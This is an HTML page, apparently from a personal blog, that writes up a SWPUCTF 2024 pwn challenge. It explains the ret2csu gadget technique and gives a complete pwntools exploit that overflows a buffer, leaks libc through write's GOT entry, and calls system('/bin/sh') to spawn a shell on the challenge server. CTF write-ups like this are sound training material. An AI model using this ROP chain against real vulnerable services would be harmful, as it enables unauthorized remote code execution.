@@ -1,0 +1,86 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>ret2csu 第一次解答</title>
+</head>
+<body>
+<b>ret2csu 第一次解答</b><br>
+<small>2025-04-20</small>
+<hr>
+<blockquote>
+<p>Problem: <a href="https://www.nssctf.cn/problem/5949">[SWPUCTF 2024 秋季新生赛]出题人你到底干了什么？</a></p>
+</blockquote>
+<br><b><a href="#思路"></a>思路</b><br>
+<p>Linux x64 Linux x86-64传递参数的方式几乎和Windows一样。但是是通过6个寄存器代替4个寄存器来传参(RDI,RSI,RDX,RCX,R8,R9)</p>
+<p>可以用ret2csu来解答</p>
+<blockquote>
+<p>.text:0000000000401226 loc_401226:                             ; CODE XREF: __libc_csu_init+35↑j<br>.text:0000000000401226                 add     rsp, 8<br>.text:000000000040122A                 pop     rbx<br>.text:000000000040122B                 pop     rbp<br>.text:000000000040122C                 pop     r12<br>.text:000000000040122E                 pop     r13<br>.text:0000000000401230                 pop     r14<br>.text:0000000000401232                 pop     r15<br>.text:0000000000401234                 retn</p>
+</blockquote>
+<p>这是需要使用的第一个gadget 避免麻烦直接从40122A开始用</p>
+<p>rbx一般设置0 rbp一般设置1 </p>
+<blockquote>
+<p> loc_401210:                             ; CODE XREF: __libc_csu_init+54↓j<br> .text:0000000000401210                 mov     rdx, r14 第一个参数<br> .text:0000000000401213                 mov     rsi, r13 第二个参数<br> .text:0000000000401216                 mov     edi, r12d 第三个参数<br> .text:0000000000401219                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]<br> .text:000000000040121D                 add     rbx, 1<br> .text:0000000000401221                 cmp     rbp, rbx<br> .text:0000000000401224                 jnz     short loc_401210</p>
+</blockquote>
+<p>如果rbx设置0 也就是直接call[r15]<br>rbp设置1 可以在cmp     rbp, rbx 拿到0<br>从而不循环跳转loc_401210<br>又跳到loc_401226<br>因为add rsp, 8 所以需要多溢出8字节<br>直接填充6*8 + 8 &#x3D; 56字节脏数据<br>然后到ret 接一个main重新溢出<br>然后就可以按照正常的ret2libc打了</p>
+<br><b><a href="#EXP"></a>EXP</b><br>
+<pre><code>  from pwn import *
+context.log_level = &#x27;debug&#x27;
+elf = ELF(&quot;./attachment&quot;)
+libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;)
+p = remote(&quot;node6.anna.nssctf.cn&quot;,26697)
+#p = process(&quot;attachment&quot;)
+write_got = elf.got[&quot;write&quot;]
+write_plt = elf.plt[&quot;write&quot;]
+gadget_csu_first = 0x40122A
+gadget_csu_second = 0x401210
+main_addr = elf.sym[&quot;main&quot;]
+payload = b&#x27;a&#x27;*88 + b&#x27;a&#x27;*16
+payload += p64(gadget_csu_first)
+payload += p64(0) #pop     rbx set 0
+payload += p64(1) #pop     rbp set 1
+payload += p64(1) #pop r12 =&gt; rdi first argument
+payload += p64(write_got) #pop r13 =&gt; rsi 2 arguc
+payload += p64(8) #pop r14 =&gt; rdx 3
+payload += p64(write_got) #pop r15 =&gt; need call 应该是call 到机器码了 而不是实际的地址 所以用got表里面的 plt 里面是 jmp call 机器码肯定报错
+# write(1, byte_402008, v3);
+&#x27;&#x27;&#x27;
+call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
+.text:0000000000401221                 cmp     rbp, rbx
+.text:0000000000401224                 jnz     short loc_401210
+&#x27;&#x27;&#x27;
+payload += p64(gadget_csu_second)
+#设置脏数据  add     rsp, 8  所以多设置8个字节脏数据
+payload += p64(0xdeadbeef)*7
+payload += p64(main_addr)
+
+&#x27;&#x27;&#x27;
+.plt.sec:0000000000401060 _write          proc near               ; CODE XREF: main+32↓p
+.plt.sec:0000000000401060 ; __unwind &#123;
+.plt.sec:0000000000401060                 endbr64
+.plt.sec:0000000000401064                 bnd jmp cs:off_404018
+.plt.sec:0000000000401064 _write          endp
+
+&#x27;&#x27;&#x27;
+
+#attach(p)
+p.send(payload)
+p.recvuntil(b&quot;!\n&quot;)
+leak_got = u64(p.recv(8))
+log.success(&quot;leak write got=&gt;&quot;+hex(leak_got))
+libc_base = leak_got - libc.sym[&quot;write&quot;]
+pop_rdi_ret = 0x401233
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+bin_sh_addr = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
+ret = 0x40101a
+payload = b&#x27;a&#x27;*88 + b&#x27;a&#x27;*16 +p64(ret) +p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(system_addr)
+p.send(payload)
+
+p.interactive()</code></pre>
+<p>需要注意的是设置r15 call的时候不能设置plt<br>因为plt里面的是jmp [offset]<br>你call他 就 相当于 call 机器码了 必报错<br>然后payload2 加一个ret 不加不对齐报错</p>
+<br><b><a href="#总结"></a>总结</b><br>
+<p>ret2csu retlibc</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
